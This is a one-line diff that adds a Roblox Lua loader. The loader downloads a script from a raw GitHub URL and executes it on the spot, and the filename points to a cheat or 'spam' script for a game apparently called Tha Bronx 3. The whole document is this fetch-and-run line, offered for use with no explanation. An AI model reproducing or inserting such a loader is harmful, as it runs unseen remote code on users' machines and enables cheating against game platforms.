@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/tha-bronx-3-spam4-4ybn5cswii3n1f.lua"))()
